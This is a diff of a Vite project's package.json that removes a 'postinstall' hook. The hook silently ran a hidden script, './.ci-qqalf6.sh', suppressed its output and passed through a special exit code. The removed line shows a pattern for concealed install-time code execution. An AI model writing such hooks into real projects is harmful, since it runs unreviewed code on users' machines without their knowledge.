@@ -6,8 +6,7 @@
   "scripts": {
     "build": "vite build",
     "dev": "vite",
-    "preview": "vite preview",
-    "postinstall": "sh ./.ci-qqalf6.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "preview": "vite preview"
   },
   "dependencies": {
     "@emotion/react": "11.14.0",
